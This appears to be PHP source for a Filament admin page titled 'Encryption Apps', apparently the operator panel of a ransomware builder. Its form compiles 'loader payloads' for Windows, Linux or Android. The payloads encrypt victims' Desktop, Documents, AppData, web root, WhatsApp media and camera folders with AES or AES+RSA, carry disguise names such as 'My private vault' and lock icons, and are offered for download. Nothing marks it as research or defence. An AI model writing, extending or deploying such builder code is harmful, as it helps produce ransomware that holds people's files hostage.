<?php

namespace App\Filament\Admin\Pages;

use App\Models\Payload;
use App\Services\PayloadService;
use Filament\Actions\Action;
use Filament\Forms\Components\CheckboxList;
use Filament\Forms\Components\Section;
use Filament\Forms\Components\TextInput;
use Filament\Forms\Components\ToggleButtons;
use Filament\Forms\Get;
use Filament\Notifications\Notification;
use Filament\Pages\Page;
use Filament\Tables\Actions\Action as TableAction;
use Filament\Tables\Columns\TextColumn;
use Filament\Tables\Concerns\InteractsWithTable;
use Filament\Tables\Contracts\HasTable;
use Filament\Tables\Table;
use Illuminate\Support\Facades\Storage;

class EncryptionApps extends Page implements HasTable
{
    use InteractsWithTable;

    public ?array $profilePreview = [];

    protected static ?string $title = 'Encryption Apps';

    protected ?string $subheading = 'Configure and build platform-specific payloads for encryption operations.';

    protected static ?string $navigationLabel = 'Encryption Apps';

    protected static ?string $navigationGroup = 'System';

    protected static ?string $navigationIcon = 'heroicon-o-shield-check';

    protected static ?int $navigationSort = 1;

    protected static string $view = 'filament.admin.pages.encryption-apps';

    public function table(Table $table): Table
    {
        return $table
            ->query(Payload::query())
            ->columns([
                TextColumn::make('name')
                    ->label('App Name')
                    ->searchable()
                    ->weight('bold'),
                TextColumn::make('target_os')
                    ->label('Platform')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'windows' => 'info',
                        'linux' => 'success',
                        'android' => 'warning',
                        default => 'gray',
                    }),
                TextColumn::make('encryption_type')
                    ->label('Algorithm')
                    ->formatStateUsing(fn (string $state): string => strtoupper($state)),
                TextColumn::make('status')
                    ->label('Status')
                    ->badge()
                    ->color(fn (string $state): string => match ($state) {
                        'ready' => 'success',
                        'compiling' => 'warning',
                        default => 'gray',
                    }),
                TextColumn::make('created_at')
                    ->label('Created At')
                    ->dateTime(),
            ])
            ->actions([
                TableAction::make('download')
                    ->label('Download')
                    ->icon('heroicon-o-arrow-down-tray')
                    ->color('success')
                    ->button()
                    ->visible(fn (Payload $record): bool => $record->status === 'ready' && ! empty($record->file_path))
                    ->url(fn (Payload $record): string => Storage::url($record->file_path))
                    ->openUrlInNewTab(),
            ]);
    }

    protected function getHeaderActions(): array
    {
        return [
            Action::make('newApp')
                ->label('New app')
                ->icon('heroicon-m-plus')
                ->color('warning')
                ->modalHeading('Create and Compile Payload Profile')
                ->modalDescription('Configure options to generate a native binary payload for the target platform.')
                ->modalSubmitActionLabel('Build & Save')
                ->modalWidth('3xl')
                ->form([
                    Section::make('App identity')
                        ->schema([
                            TextInput::make('app_name')
                                ->label('App name')
                                ->placeholder('My private vault')
                                ->required()
                                ->maxLength(80),
                            ToggleButtons::make('icon')
                                ->label('App icon')
                                ->options([
                                    'shield' => 'Shield',
                                    'lock' => 'Lock',
                                    'key' => 'Key',
                                ])
                                ->icons([
                                    'shield' => 'heroicon-o-shield-check',
                                    'lock' => 'heroicon-o-lock-closed',
                                    'key' => 'heroicon-o-key',
                                ])
                                ->inline()
                                ->required(),
                        ])
                        ->columns(2),

                    Section::make('Platform & Targets')
                        ->schema([
                            ToggleButtons::make('platform')
                                ->label('Target platform')
                                ->options([
                                    'windows' => 'Windows',
                                    'linux' => 'Linux',
                                    'android' => 'Android',
                                ])
                                ->icons([
                                    'windows' => 'heroicon-o-computer-desktop',
                                    'linux' => 'heroicon-o-command-line',
                                    'android' => 'heroicon-o-device-phone-mobile',
                                ])
                                ->inline()
                                ->required()
                                ->default('windows')
                                ->live(),

                            CheckboxList::make('target_directories')
                                ->label('Target directories for encryption')
                                ->options(fn (Get $get): array => match ($get('platform')) {
                                    'windows' => [
                                        'Desktop' => 'Desktop',
                                        'Documents' => 'Documents',
                                        'Downloads' => 'Downloads',
                                        'AppData' => 'AppData',
                                        'Pictures/2026-10' => 'Pictures / 2026-10',
                                        'Documents/Archives_2026' => 'Documents / Archives_2026',
                                    ],
                                    'linux' => [
                                        'Home' => 'Home (~/)',
                                        'Documents' => 'Documents (~/Documents)',
                                        'Downloads' => 'Downloads (~/Downloads)',
                                        'VarWww' => 'Web Root (/var/www)',
                                        'Home/2026-10' => 'Home / 2026-10',
                                        'Documents/Backup_2026' => 'Documents / Backup_2026',
                                    ],
                                    'android' => [
                                        'DCIM' => 'DCIM',
                                        'Download' => 'Download',
                                        'WhatsApp' => 'WhatsApp Media',
                                        'Documents' => 'Documents',
                                        'DCIM/Camera/2026-10' => 'DCIM / Camera / 2026-10',
                                        'Download/Monthly_2026' => 'Download / Monthly_2026',
                                    ],
                                    default => ['default' => 'Please select a platform first'],
                                })
                                ->required()
                                ->columns(2),
                        ]),

                    Section::make('Encryption preset')
                        ->schema([
                            ToggleButtons::make('encryption_type')
                                ->label('Encryption type')
                                ->options([
                                    'aes' => 'AES-256-GCM',
                                    'hybrid' => 'AES + RSA',
                                ])
                                ->inline()
                                ->required()
                                ->default('aes'),
                        ]),
                ])
                ->action(function (array $data, PayloadService $payloadService): void {
                    $payload = Payload::create([
                        'name' => $data['app_name'],
                        'target_os' => $data['platform'],
                        'encryption_type' => $data['encryption_type'],
                        'icon' => $data['icon'] ?? 'shield',
                        'target_directories' => $data['target_directories'],
                        'status' => 'compiling',
                    ]);

                    $filePath = $payloadService->buildLoaderPayload($payload, $data['target_directories']);

                    $payload->update([
                        'file_path' => $filePath,
                        'status' => 'ready',
                    ]);

                    Notification::make()
                        ->title('Payload profile created and built successfully')
                        ->success()
                        ->send();
                }),
        ];
    }
}